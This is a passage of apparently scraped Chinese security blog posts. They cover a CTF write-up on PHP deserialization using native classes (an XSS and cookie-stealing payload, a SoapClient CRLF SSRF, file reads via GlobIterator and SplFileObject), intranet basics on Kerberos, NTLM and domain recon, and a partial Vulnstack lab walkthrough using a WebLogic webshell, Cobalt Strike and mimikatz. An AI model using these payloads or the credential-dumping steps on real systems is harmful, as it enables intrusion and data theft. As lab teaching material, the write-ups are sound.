urlencode(serialize($a));\n#O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A29%3A%22%3Cscript%3Ealert%28%27xss%27%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A40%3A%22D%3A%5CphpStudy%5CPHPTutorial%5CWWW%5Chtml%5C877.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D\n\n也可以直接弹Cookie\n&lt;?php\n$str = new Exception(\"&lt;script>window.location.href='url/?'+document.cookie&lt;/script>\");\necho urlencode(serialize($str));\n?>\n\n没图的话有些抽象，这里借用一下春告鳥大师傅的图。\n\nSSRFCTFSHOW web[259]题目环境https://ctf.show/challenges#web259-719\n源码如下\n#index.php\n&lt;?php\n\nhighlight_file(__FILE__);\n\n\n$vip = unserialize($_GET['vip']);\n//vip can get flag one key\n$vip->getFlag();\n\n#flag.php\n$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);\narray_pop($xff);\n$ip = array_pop($xff);\n\n\nif($ip!=='127.0.0.1')&#123;\n\tdie('error');\n&#125;else&#123;\n\t$token = $_POST['token'];\n\tif($token=='ctfshow')&#123;\n\t\tfile_put_contents('flag.txt',$flag);\n\t&#125;\n&#125;\n\n\n这里的话可以看到它是按照HTTP_X_FORWARDED_FOR对请求报文进行分离，后半部分为$ip，我们这里的User-Agent即位于$ip中，因此我们可以借用SoapClient+CRLF实现SSRF，将上面demo中的代码进行更改即可，具体如下\n&lt;?php\n$target = 'http://127.0.0.1/flag.php';\n$post_data = 'token=ctfshow';\n$headers = array('X-Forwarded-For: 127.0.0.1,127.0.0.1');\n$a = new SoapClient(null,array('location' => $target,'user_agent'=>'qwq^^Content-Type: application/x-www-form-urlencoded^^'.join('^^',$headers).'^^Content-Length: '. (string)strlen($post_data).'^^^^'.$post_data,'uri'=>'test'));\n$b = serialize($a);\n$b = str_replace('^^',\"\\r\\n\",$b);\n$b = str_replace('&amp;','&amp;',$b);\necho urlencode($b);  // 随便调用对象中不存在的方法, 触发__call方法进行ssrf\n#O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A203%3A%22qwq%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AUM_distinctid%3A175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D\n?>\n\n接下来赋值给vip参数\n\n接下来访问flag.txt\n\n遍历目录+文件读取CTFSHOW 愚人杯[被遗忘的反序列化]环境如下https://ctf.show/challenges#%E8%A2%AB%E9%81%97%E5%BF%98%E7%9A%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3968\n代码如下\n&lt;?php\n\n# 当前目录中有一个txt文件哦\nerror_reporting(0);\nshow_source(__FILE__);\ninclude(\"check.php\");\n\nclass EeE&#123;\n    public $text;\n    public $eeee;\n    public function __wakeup()&#123;\n        if ($this->text == \"aaaa\")&#123;\n            echo lcfirst($this->text);\n        &#125;\n    &#125;\n\n    public function __get($kk)&#123;\n        echo \"$kk,eeeeeeeeeeeee\";\n    &#125;\n\n    public function __clone()&#123;\n        $a = new cycycycy;\n        $a -> aaa();\n    &#125;\n    \n&#125;\n\nclass cycycycy&#123;\n    public $a;\n    private $b;\n\n    public function aaa()&#123;\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\")&#123;\n            eval($_POST[\"eval\"]);\n        &#125;\n    &#125;\n\n\n    public function __invoke()&#123;\n        $a_a = $this -> a;\n        echo \"\\$a_a\\$\";\n    &#125;\n&#125;\n\nclass gBoBg&#123;\n    public $name;\n    public $file;\n    public $coos;\n    private $eeee=\"-_-\";\n    public function __toString()&#123;\n        if(isset($this->name))&#123;\n            $a = new $this->coos($this->file);\n            echo $a;\n        &#125;else if(!isset($this -> file))&#123;\n            return $this->coos->name;\n        &#125;else&#123;\n            $aa = $this->coos;\n            $bb = $this->file;\n            return $aa();\n        &#125;\n    &#125;\n&#125;   \n\nclass w_wuw_w&#123;\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup()&#123;\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -> key))&#123;\n            $this->key = file_get_contents($this -> file);\n        &#125;else&#123;\n            echo \"不行哦\";\n        &#125;\n    &#125;\n\n    public function __destruct()&#123;\n        echo $this->aaa;\n    &#125;\n\n    public function __invoke()&#123;\n        $this -> aaa = clone new EeE;\n    &#125;\n&#125;\n\n$_ip = $_SERVER[\"HTTP_AAAAAA\"];\nunserialize($_ip);\n\n寻找出口，发现这个eval函数，具体代码如下\nclass cycycycy&#123;\n    public $a;\n    private $b;\n\n    public function aaa()&#123;\n        $get = $_GET['get'];\n        $get = cipher($get);\n        if($get === \"p8vfuv8g8v8py\")&#123;\n            eval($_POST[\"eval\"]);\n        &#125;\n    &#125;\n\n当满足$get === &quot;p8vfuv8g8v8py&quot;才可实现命令执行，但这里get参数被加密了，所以可以尝试下PHP原生类，此时的思路如下，它提示了当前目录存在txt文件，我们知道Globlterator类只需要知道文件名的一部分，就可以获取整个文件名，因此我们可以通过它来寻找txt文件。如何触发Globlterator类呢，当然是找有a(b)此类的，且a,b均可控，同时对函数进行输出，此时看到gBoBg类中的__tostring方法\npublic function __toString()&#123;\n        if(isset($this->name))&#123;\n            $a = new $this->coos($this->file);\n            echo $a;\n\n\n\n这个完全符合条件，我们给coos赋值为Globlterator，给file赋值为*txt即可输出含有txt的文件名。但如何触发__tostring魔术方法呢，__tostring魔术方法是当函数被当做字符串时触发的，因此我们随便找一个即可，这里看到w_wuw_w类中的key参数，$this-&gt;key这个就可以作为__tostring的函数触发点。\nclass w_wuw_w&#123;\n    public $aaa;\n    public $key;\n    public $file;\n    public function __wakeup()&#123;\n        if(!preg_match(\"/php|63|\\*|\\?/i\",$this -> key))&#123;\n            $this->key = file_get_contents($this -> file);\n        &#125;else&#123;\n            echo \"不行哦\";\n        &#125;\n    &#125;\n\n因此接下来构造一下代码\n&lt;?php\nclass gBoBg&#123;\n    public $name='1';\n    public $file='*txt';\n    public $coos='GlobIterator';\n&#125;   \n\nclass w_wuw_w&#123;\n    public $aaa;\n    public $key;\n    public $file;\n&#125;\n$pop = new w_wuw_w();\n$pop->key = new gBoBg();\n$pop->file = '123'; \necho serialize($pop);\n#O:7:\"w_wuw_w\":3:&#123;s:3:\"aaa\";N;s:3:\"key\";O:5:\"gBoBg\":3:&#123;s:4:\"name\";s:1:\"1\";s:4:\"file\";s:4:\"*txt\";s:4:\"coos\";s:12:\"GlobIterator\";&#125;s:4:\"file\";s:3:\"123\";&#125;\n\n赋值给$_SERVER[&quot;HTTP_AAAAAA&quot;];这个其实在请求头字段进行赋值，我们这里的话，AAAAAA= &#39;xxx&#39;即可实现赋值\n\n发现h1nt.txt，接下来用SplFileObject 类进行读取即可\n&lt;?php\nclass gBoBg&#123;\n    public $name='1';\n    public $file='h1nt.txt';\n    public $coos='SplFileObject';\n&#125;   \n\nclass w_wuw_w&#123;\n    public $aaa;\n    public $key;\n    public $file;\n\n&#125;\n$pop = new w_wuw_w();\n$pop->key = new gBoBg();\n$pop->file = '123'; \necho serialize($pop);\n#O:7:\"w_wuw_w\":3:&#123;s:3:\"aaa\";N;s:3:\"key\";O:5:\"gBoBg\":3:&#123;s:4:\"name\";s:1:\"1\";s:4:\"file\";s:8:\"h1nt.txt\";s:4:\"coos\";s:13:\"SplFileObject\";&#125;s:4:\"file\";s:3:\"123\";&#125;\n\n\n\n\nemmm，只给出了这样一句话，应该是没回显完整，但此时转念一想，这个只是hint，里面应该也不会有flag，我们为什么不直接去根目录找flag文件然后读呢，因此接下来尝试去根目录下寻找flag文件。\n&lt;?php\nclass gBoBg&#123;\n    public $name='1';\n    public $file='/f*';\n    public $coos='GlobIterator';\n&#125;   \n\nclass w_wuw_w&#123;\n    public $aaa;\n    public $key;\n    public $file;\n\n&#125;\n$pop = new w_wuw_w();\n$pop->key = new gBoBg();\n$pop->file = '123'; \necho serialize($pop);\n#O:7:\"w_wuw_w\":3:&#123;s:3:\"aaa\";N;s:3:\"key\";O:5:\"gBoBg\":3:&#123;s:4:\"name\";s:1:\"1\";s:4:\"file\";s:3:\"/f*\";s:4:\"coos\";s:12:\"GlobIterator\";&#125;s:4:\"file\";s:3:\"123\";&#125;\n\n\n\n疑似发现flag文件f1agaaa，尝试读取\n&lt;?php\nclass gBoBg&#123;\n    public $name='1';\n    public $file='/f1agaaa';\n    public $coos='SplFileObject';\n&#125;   \n\nclass w_wuw_w&#123;\n    public $aaa;\n    public $key;\n    public $file;\n\n&#125;\n$pop = new w_wuw_w();\n$pop->key = new gBoBg();\n$pop->file = '123'; \necho serialize($pop);\n\n\n\n成功获取flag。\n参考文献https://johnfrod.top/%E5%AE%89%E5%85%A8/ctf-%E4%B8%AD-php%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/\nhttp://arsenetang.com/2021/10/29/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87%E4%B9%8BPHP%E5%8E%9F%E7%94%9F%E7%B1%BB%E7%9A%84%E8%BF%90%E7%94%A8/#%E5%88%A9%E7%94%A8SoapClient%E5%AE%9E%E7%8E%B0SSRF\nhttps://www.freebuf.com/articles/web/356530.html\nhttps://xz.aliyun.com/t/9293#toc-10\n","slug":"PHP常见内置类浅析","date":"2023-04-07T18:36:20.000Z","categories_index":"WEB知识","tags_index":"反序列化","author_index":"quan9i"},{"id":"669ca80a1e42174aff287d7a7a620a36","title":"内网渗透基础(一)","content":"内网基础概念内网的概念究竟什么是内网呢？《内网渗透攻防》中如是说\n内网也指局域网，是指在某一区域由多台计算机互连而成的计算机组。\n工作组在一个大型单位中，可能有成百上千台计算机，他们相互连接组成局域网，如果不进行分组，那么网络关系就会杂乱不堪，此时工作组的出现，成功解决了这个问题。它将局域网中不同的计算机按功能分别列入不同的工作组，使得网络更有序。\n域域是一个有安全边界的计算机集合（安全边界是指在两个域中，一个域中的用户无法访问另一个域中的资源），可以简单地把域理解为升级版的工作组。用户要想访问域内的资源，必须以合法的身份登录域，而用户对域内的资源拥有什么样的权限，还取决于用户在域内的身份。\n域内涉及了多个概念，例如域控制器、单域、域树等，接下来依次介绍\n域控制器DC（Domain Controller），域控制器是域中一台类似管理服务器的主机，它拥有管理域内其他主机的计算机，它负责所有本域内的计算和用户的验证工作，它是整个域的通信枢纽，域内所有用来验证身份的账号和密码哈希都存在域控制器中。所以，内网渗透的最终目标常常就是为了攻下域控服务器，这样就等同于控制整个域内的计算机。\n单域单域，就是指只有一个域环境的网络，这里需要说明的是，一般在一个域中，至少会有两台域服务器，一台作为DC，另一台作为备份DC\n父域和子域当存在多个域时，第一个域称为父域，各分部的域称为该域的子域。例如，xx公司总部设在北京，而在杭州，上海等地设有分公司，他们进行信息交互这种就需要用到父域和子域，此时，北京的这个就是父域，而处于杭州、上海的域就是分域。这样有什么好处呢\n减小了域之间信息交互的压力（域内信息交互不会压缩，域间信息交互可压缩）\n不同的子域可以指定特定的安全策略\n父子域中域名使用一个.表示一个层次，放在域名最后的子域称为最高级子域或一级子域，它前面的子域称为二级域 。\n现在，比如父域是quan9i.top，那么abc.quan9i.top就是一级子域，cn.abc.quan9i.top就是二级域\n域树域树是多个域通过建立信任关系组成的集合。当两个域内需要相互访问时，就需要建立信任关系。建立信任关系后，可以将父子域连接成树状格式，此时就可以实现相互访问。\n域森林域森林是指多个域树通过建立信任关系组成的集合。例如，当前有域树abc.net和域树abc.com，两个本来是无法实现互相访问的，而当两个域树建立信任关系后，它们可以组成一个集合形式（域森林），实现相互访问。\n域名服务器域名服务器(Domain Name Server,简称DNS)是指用于实现域名和与之对应的IP地址转换的服务器。简单的说，就是实现域名到IP地址的转换 。同时，域的名字就是DNS的名字，之所以出现这个情况是因为域中计算机使用DNS来定位DC、服务器等计算机。\n活动目录**活动目录(Active Directory，简称AD)**是指域环境中提供目录服务的组件。\n它用于存储有关网络对象(用户、组、计算机、共享资源等)的信息,目录服务是指帮助用户快速、准确地寻找其所需要的服务。活动目录实现了目录服务，为企业提供了网络环境的集中式管理机制。\n活动目录的逻辑结构包括组织单元（OU）、域、域树、域森林，那什么是逻辑结构呢，它的定义是不考虑被管理对象的具体位置的组织框架。 \n活动目录主要提供以下功能:\n1、账号集中管理 : 所有账号均存储在服务器中，以便执行命令和重置密码等\n2、软件集中管理：统一推送软件、安装打印机等。利用软件发布策略分布软件，可以让用户自由选择需要安装的软件\n3、环境集中管理：统一客户端桌面、IE、TCP/IP协议等设置\n4、增强安全性：统一部署杀毒软件和病毒扫描任务、集中管理用户的计算机权限、统一制定密码策略等。\n5、更可靠、更短的宕机时间：例如，利用活动目录控制用户访问权限，利用群集、负载均衡等技术对文件服务器进行容灾设置\n域控与活动目录的区别活动目录数据库，即拥有层次结构的数据库，简称为AD库。\n要实现域环境，其实就是要安装AD库。如果内网中的一台计算机上安装了AD，那它就变成了DC(用于存储活动目录数据库的计算机，即域控)\n安全域的划分在一个用路由器连的内网中，可以将网络划分为三个区域：**内网(安全级别最高)、DMZ(安全级别中等)、外网(安全级别最低)**，接下来对三个区域分别进行简单介绍。\n内网内网：其拥有两个区：\n1、核心区(存储企业最重要的数据、文档等信息资产，往往只有很少的主机能访问)\n2、办公区(公司员工日常的工作区，一般能够访问DMZ，部分主机可访问核心区)\nDMZDMZ(Demilitarized Zone，称为隔离区)，其是一个非安全系统与安全系统之间的缓冲区，也就是说，DMZ一般位于内网和外部网络之间。这里主要用于对外提供服务，可以在此放置一些必须公开的服务器设施，例如企业Web服务器、FTP服务器和论坛服务器等\n外网Internet，安全级别最低。\n三者关系在配置一个拥有DMZ的网络时，通常需要定义如下访问控制策略，以实现其屏障功能。\n1、内网可以访问外网：内网用户需要自由地访问外网\n2、内网可以访问DMZ：此策略使内网用户可以使用或者管理DMZ中的服务器\n3、外网不能访问内网：内网中存储的是公司内部数据，这些数据一般是不允许外网用户访问的(如果要访问，可以通过VPN方式进行)\n4、外网可以访问DMZ:因为DMZ中的服务器需要为外界提供服务，所以外网必须可以访问DMZ\n5、DMZ不能访问内网:如果不执行此策略，当攻击者攻陷DMZ时，内网将无法受到保护\n6、DMZ不能访问外网:此策略也有例外。例如，在DMZ放置了邮件服务器，就要运行访问外网，否则邮件服务器无法正常工作\n内网信息搜集网络信息ipconfig /all查看网络配置信息\n\nnetstat -ano查询端口连接情况\n\nroute print查询路由表\n\n**arp -a **查看arp缓存\n\n系统信息systeminfo查询系统信息以及补丁列表\n\n**echo %PROCESSOR_ARCHITECTURE%**查询系统体系结构\n\n域相关net view /domain查找域\n\nnet group /domain用于获取域用户组信息\n\nnet user /domain用于获取所有域用户列表\n\nnet user xxx /domain用于查询指定域用户详细信息\n\nnet config workstation查看当前工作域\n\nnet group “domain controllers” /domain查询域控\n\nwmic useraccount get /all获取域内用户详细信息\n\ndsquery user查询存在的用户\n\n其他tasklist查询进程列表\n\nnetsh firewall show config查看防火墙配置\n\nschtasks /query /fo LIST /v查询定时任务\n\n信任协议运行 Windows Server 2008 或 Windows Server 2008 R2 的域控使用以下两个协议之一对用户和应用程序进行身份验证：Kerberos 版本 5 (V5) 协议或 NTLM（New Technology LAN Manager）。\nNTLM是Windows NT早期的信任协议，现在的Server2000、2003等服务器，都是默认采用的Kerberos V5，只有在事务中任意台计算器不支持Kerberos时，才会使用NTLM。\nKerberos协议Kerberos是一种网络身份验证协议。它旨在使用密钥加密技术为客户端/服务端应用程序提供强身份验证。\n这个协议主要涉及三个角色\n1、访问服务的客户端(Client): Kerberos客户端代表需要访问资源的用户进行操作的应用程序，例如打开文件、查询数据库等。每个Kerberos客户端在访问资源前都会请求身份验证。\n    \n2、提供服务的服务端(Server): 域内提供服务的服务端，服务都有唯一的服务主体名称(SPN)\n    \n3、提供认证服务的密钥分发中心(KDC,Key Distribution Center):\nKDC是一种网络服务，它向活动目录域内的用户和计算机提供会话票据和临时会话密钥，其服务账号为krbtgt(创建活动目录时系统自动生成的用户，其密码由系统随机生成，无法正常登录主机)。KDC运行在每个域控制器上。\n\n他们的关系如下图所示\n\n他们的关系即Client要访问Server，则必须需要票据，而票据则是由KDC提供\n针对KDC，这里需要进行简单说明\nKDC一般安装在域控中，KDC具体分为两部分\nAuthentication Server和Ticket Granting Server\n\n前者的作用是用于验证Client的身份(类似我们刷脸验证，确认与身份证上的人一致)，如果验证通过，就会颁发TGT（Ticket Granting Ticket）票据给Client。而后者的作用是通过Authentication Server颁发的TGT票据换取Server服务端的Service Ticket票据(类似电影票二维码扫码取票操作)。\nkerberos认证过程首先，在开始之前对稍后需要用到的名词进行简单介绍\nDC(Domain Controller)：域控制器。\n\nKDC(Key Distribution Center)：秘钥分发中心，默认安装在域控里，包括AS和TGS。\n\nAS(Authentication Service)：身份验证服务，用于KDC对Client认证。\n\nTGS(Ticket Grantng Service)：票据授予服务，用于KDC向Client和Server分发Session Key（临时秘钥）。\n\nTGT(Ticket Granting Ticket)：认证票据，用于验证Client的身份。\n\nST(Server Ticket)：服务票据。\n\nAD(Active Directory)：活动目录，用于存储用户、用户组、域相关的信息。\n\nClient：客户端，也可以理解为用户。\n\nServer：服务端，可以是某台计算机，也可以是某个域内服务。\n\nkrbtgt用户：创建域控时由系统自动生成的用户。\n\n过程一Client通过As验证，获取TGT\n当Client要访问Server时，需要AS来进行身份认证，Client输入账密，并向KDC发送一个AS_REQ(由使用了Client的NTLM-Hash加密的时间戳、Client信息以及Server信息等组成)。\nAs收到服务端发送的AS_REQ，首先向AD查询是否存在此用户，存在的话则用此用户的NTLM-Hash来进行解密，如果解密成功，且解密后得到的时间戳与当时的时间相差在5分钟内则认为其认证成功。\n这里之所以限制5分钟，是为了保证AS_REQ的安全，在传输它的过程中，可能会被黑客截获，如果黑客想进行重放攻击，就需要花费一定时间，所以五分钟就起到了包含AS_REQ的作用\n这里存在两个验证\n1、Client对As的验证\n2、As如何判断此Client为真\n\n第一个，如何判断As为真，使用Client的NTLM-Hash进行加密，如果As为真则可以正常解密AS_REQ。\n第二个，如何验证Client为真，如果Client为真，则As用Client的NTLM-Hash是可以正确解密出来的。\n接下来AS会生成一个AS_REP，AS_REP由两部分组成\n1、As生成的临时密钥Session-key，然后使用Client的NTLM-Hash加密，用于Client和KDC进行安全通信\n2、TGT，内容由使用特定用户krbtgt的NTLM-Hash加密的Sessions-key、时间戳以及部分用户信息组成\n\n过程二Client与TGS认证，获取ST服务票据\n当Client收到了As的AS_REQ时，会使用自己的NTLM-Hash，将被加密过的临时密钥Session-key进行解密，然后将其保存在本地，如果需要访问Server时就可以构成TGS_REQ(包含Session-key、加密的时间戳以及服务端信息、krbtgt用户NTLM-Hash加密的TGT等)提交给TGS，从而获取对应的ST\n当TGS收到TGS_REQ后，首先对Krbtgt用户NTLM-Hash加密的TGT进行解密，目的是得到Sessions-key、时间戳以及服务端信息等。与过程一类似，它有一个时间校验机制，如果时间戳和解密时间相差太久则终止验证，同时TGS会根据TGT里的Client信息和当前信息进行比对，判断是否为同一人，判断无误后会去判断此Client是否拥有访问Server的权限，若有则返回TGS_REP，它由两部分组成\n1、TGS生成的新Session-key，然后再使用第一个过程中As生成的Session-key进行加密。\n2、使用Server的NTLM-Hash加密的Sessions-key(由TGS生成的)、时间戳以及用户信息，此即ST服务票据\n\n\n\n在此过程中存在一个验证\n1、TGS如何判断Client为真\n\n这里一开始解密的是Session-key(As生成的)，而这个Session-key处了Dc就只有Client知道。\n过程三Cleint收到了TGS_REP，得到加密的Sessions-key，接下来操作同上，利用刚刚存储的Sessions-key(As生成的)对Sessions-key(TGS生成的)进行解密，得到未加密的Session-key(TGS生成的)，然后存储在本地。\n当Client需要访问Server时，Client会发生AP_REQ\nAP_REQ由Sessions-key(TGS生成的)、时间戳、服务端信息等内容组成，然后再把ST服务票据一同发送给Server。\nServer收到AP_REQ使用自己的NTLM-Hash对ST服务票据进行解密，拿到Sessions-key(TGS生成的)、时间戳、服务端信息等数据，而后根据ST内的时间戳与解密时时间作对比，如果时间未超过8小时则验证成功，反之失败。然后Server询问DC该用户是否有访问权限，如果有则允许Client访问Server\n图示如下（摘自先知社区，不过好像是来源于csdn的，但未在csdn中找到）\n\nNTLM协议在学习 NTLM协议前，首先需要了解两个基本概念，SSPI和SSP\nSSPI**SSPI(Security Service Provider Interface，安全服务提供接口)**是Windows定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于:\n身份验证机制\n为其他协议提供的 Session Securtiy机制\n\n但SSPI仅仅只是定义了一套接口函数，并未实现具体内容。\nSSP**SSP(Security Serivice Provider，安全服务提供者)**是SSPI的实现者。微软自己实现了很多SSP，用于提供安全功能，包含但不限于：\nNTLM SSP:Windows NT 3.51中引入(msv1_0.dll)，为Windows 2000之前的客户端-服务器域和非域身份验证提供NTLM质询/响应身份验证\nKerberos SSP：WIndows 2000 中引入， Windows Vista 中更新为支持AES，为Windows 2000 及更高版本中首选的客户端-服务器域提供相互身份验证\nDigest SSP: 在Windows和非Windows系统间提供HTTP和SASL身份验证的质询/响应\nNegotiate SSP: 默认选择Kerberos，如果不可选则选择NTLM协议。提供单点登录功能\n\n关系图如下\n\nLM HashLM hash本质是DES加密，目前Windows已将LM Hash禁用(从 Windows Vista 和 Windows Server 2008开始，原因是容易被破解)。LM Hash明文密码被限定在14位以内，也就是说，若要停止使用LM Hash，将用户密码设置为14位以上即可。\nLM Hash的加密流程如下，这里以P@ss1234为例\n1、将用户的明文口令转换为大写，并转换为十六进制字符串\np@ss1234 -> P@SS1234 -> 5040535331323334\n2、如果转换后的十六进制字符串长度不足14Byte(长度28)，则用0来补全\n5040535331323334 -> 5040535331323334000000000000\n3、 将14B分为两组，每组7B，然后转换为二进制数据，每组二进制数据长度为56bit\n\n\n4、将每组二进制数据按7bit为一组，分为8组，每组末尾加0，再转换为十六进制，此时每组也就成了8B长度的十六进制数据了\n\n\n5、将生成的两组8B的十六进制数据，分别作为DES加密秘钥对字符串\"KGS!@#S%\"进行加密。而后将密文进行拼接，即可得到最终的LM Hash值\n\n\n\n\nNTLM Hash加密算法NTLM Hash算法是微软为了在提高安全性的同时保证兼容性而设计的散列加密算法，它是基于MD4加密算法进行加密的。\n其加密流程如下，这里仍以明文密码P@ss1234为例\n1、将用户密码转换为十六进制格式\n    P@ss1234 -> 5040535331323334\n2、将ASCII编码的十六进制格式的字符串转为Unicode编码\n    5040535331323334 -> 50004000730073003100320033003400\n3、对Unicode编码的十六进制字符串进行标准MD4单向Hash加密\n    50004000730073003100320033003400 -> 74520a4ec2626e3638066146a0d5ceae\n\n上述过程亦可用Python实现，代码如下\nimport hashlib,binascii;\n\nkey = \"P@ss1234\"\n\nNTLM_Hash = binascii.hexlify(hashlib.new(\"md4\",key.encode(\"utf-16le\")).digest()).decode(\"utf-8\")\n\n#binascii.hexlify():返回二进制数据的十六进制表示。 每个字节被转换成相应的 2位十六进制表示形式。\n#hashlib.new()是一个通用构造函数，它将所需算法的字符串 name 作为其第一个参数。 它还允许访问上面列出的哈希值以及您的 OpenSSL 库可能提供的任何其他算法。\n#digest():返回摘要，作为二进制数据字符串值\n\nprint(NTLM_Hash)\n\n\nWindows系统存储的NTLM Hash在Windows环境中，用户的密码经过NTLM Hash加密后存储在C:\\Windows\\system32\\config\\SAM文件中。它的认证过程如下所示：\n在用户输入密码进行本地认证过程中，所有操作都是于本地进行的，系统将密码转换为NTLM Hash，而后与SAM文件中的NTLM Hash进行比较，相同则密码正确。\n接下来说一点其他的，mimikatz是如何抓取密码的呢。这里也牵扯到这个，具体如下：\n当用户注销、重启、锁屏后，操作系统就会让winlogon.exe显示登录界面，也就是输入框。当winlogon.exe接收输入后，将密码交给lsass.exe进程，lsass.exe进程中会存一份明文密码，我们使用mimikatz就是从这里(lsass.exe进程)抓取明文密码或者Hash密码。\n\nNTLM协议认证NTLM协议是基于一种质询/响应的验证机制，其由三种类型消息组成\nType 1 (协商)\nType 2 (质询)\nType 3 (认证)\n\n\n工作组环境的NTLM认证流程如下图所示\n\n具体认证过程如下\n1、当客户端需要访问服务器的某个服务时，就需要进行身份验证。此时客户端输入用户名和密码进行验证后，就会在本地缓存一份服务器密码的NTLM Hash值，而后客户端向服务端发送一个请求(包含服务器用户名和其他一些需要协商的消息)，此过程为Type 1 协商消息\n2、服务端收到客户端消息后，读取服务端所支持的内容，取出部分信息传入NTLM SSP（部分信息指的是自己能接受的服务内容、加密等级、安全服务等），得到Type 2 质询消息，并将此发回给客户端(消息包含16位的随机Challenge质询值，服务端也会有缓存)\n3、客户端收到Type 2消息后，读取服务端内容并取出Challenge，而后用过程1中本地缓存的NTLM Hash对Challenge进行加密得到Response消息。最后将Response、用户名以及其他信息封装到NTLMSSP_AUTH消息中(Type 3认证消息)，发往服务端\n4、服务端收到验证消息后，取出Net-NTLM Hash，而后用自己密码的NTLM Hash对过程2中的Challenge值进行加密，得到自己的Net-NTLM Hash，比较两者是否相等，如果相等，则说明密码正确，反之则错误，认证失败。\n参考文献《域渗透攻防指南》\n《内网安全攻防：渗透测试实战指南》\n","slug":"内网基础","date":"2023-03-27T18:04:20.000Z","categories_index":"内网","tags_index":"内网","author_index":"quan9i"},{"id":"17233f7222e00ac9cd24594c3babf058","title":"内网靶场实战——ATT&CK实战系列（二）","content":"环境搭建靶场链接http://vulnstack.qiyuanxuetang.net/vuln/detail/3/\n靶场拓扑图如下\n\n对于网卡配置的话，这里只需要两个\n一是外网，即192.168.111.0网段\n二是内网，即10.10.10.0网段\n\n然后修改一下三台机器的网络适配器即可，最终三台内网及攻击机IP情况如下\nDC:  内网 10.10.10.10\nPC:  内网 10.10.10.201 外网 192.168.111.201\nWEB: 内网 10.10.10.80  外网 192.168.111.80\n攻击机: 192.168.111.128\n\n此时环境已配置好，接下来去C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain目录下以管理员身份运行\nstartWebLogic.bat，开启Weblogic服务。\n至此环境搭建完成，可以开始进行内网靶场渗透了。\n外网打点假定现在已获取外网IPhttp://192.168.111.80:7001/\n接下来先用nmap探测一下存活端口\nnmap -p1-65535 -Pn -A -T4 192.168.111.80 \n\n\n对端口进行简单分析\n139端口：存在Samba服务，可能存在爆破、未授权访问、RCE等漏洞\n445端口：存在SMB服务，可能存在永恒之蓝漏洞\n1433端口：存在Mssql服务，可能存在爆破、注入等漏洞\n3389端口：存在RDP服务，可能实现远程登录\n7001端口：存在Weblogic服务，可能存在RCE漏洞\n\n博主什么也不会，只是个工具小子，接下来用工具进行扫描\n\n探测到存在一些漏洞，接下来用Weblogic-GUI工具进行webshell的写入\n\n接下来去冰蝎上尝试进行连接\n\n\n成功getshell\n接下来打开cs，设置一下木马\n\n需要注意的是这里的host是攻击机ip(kali)，而非我们靶机，接下来去上传Cs木马，而后执行即可上线\n\n内网渗透密码抓取首先用Mimikatz抓取一下密码\n\n提权接下来尝试提权\n右键后选择Access中的Elvate\n\n\n接下来点击Launch\n\n成功提权\n内网信息搜集shell systeminfo查看系统相关信息\n主机名:           WEB\nOS 名称:          Microsoft Windows Server 2008 R2 Standard \nOS 版本:          6.1.7601 Service Pack 1 Build 7601\nOS 制造商:        Microsoft Corporation\nOS 配置:          成员服务器\nOS 构件类型:      Multiprocessor Free\n注册的所有人:     Windows 用户\n注册的组织:       \n产品 ID:          00477-001-0000421-84103\n初始安装日期:     2019/9/8, 19:01:04\n系统启动时间:     2023/3/19, 14:16:56\n系统制造商:       VMware, Inc.\n系统型号:         VMware Virtual Platform\n系统类型:         x64-based PC\n处理器:           安装了 1 个处理器。\n                  [01]: AMD64 Family 25 Model 80 Stepping 0 AuthenticAMD ~3293 Mhz\nBIOS 版本:        Phoenix Technologies LTD 6.00, 2020/7/22\nWindows 目录:     C:\\Windows\n系统目录:         C:\\Windows\\system32\n启动设备:         \\Device\\HarddiskVolume1\n系统区域设置:     zh-cn;中文(中国)\n输入法区域设置:   zh-cn;中文(中国)\n时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐\n物理内存总量:     2,047 MB\n可用的物理内存:   800 MB\n虚拟内存: 最大值: 4,095 MB\n虚拟内存: 可用:   2,534 MB\n虚拟内存: 使用中: 1,561 MB\n页面文件位置:     C:\\pagefile.sys\n域:               de1ay.com\n登录服务器:       \\\\WEB\n修补程序:         安装了 3 个修补程序。\n                  [01]: KB2999226\n                  [02]: KB958488\n                  [03]: KB976902\n网卡:             安装了 2 个 NIC。\n                  [01]: Intel(R) PRO/1000 MT Network Connection\n                      连接名:      本地连接\n                      启用 DHCP:   否\n                      IP 地址\n                        [01]: 192.168.111.80\n                        [02]: fe80::a870:5bd2:d2e5:359a\n                  [02]: Intel(R) PRO/1000 MT Network Connection\n                      连接名:      本地连接 2\n                      启用 DHCP:   否\n                      IP 地址\n                        [01]: 10.10.10.80\n                        [02]: fe80::e08e:dc58:7238:1b1f\n\n\n net config workstation查看当前工作域\n\nipconfig /all查看版本信息\n\n发现该机器具有双网卡\nshell net group &quot;domain controllers&quot; 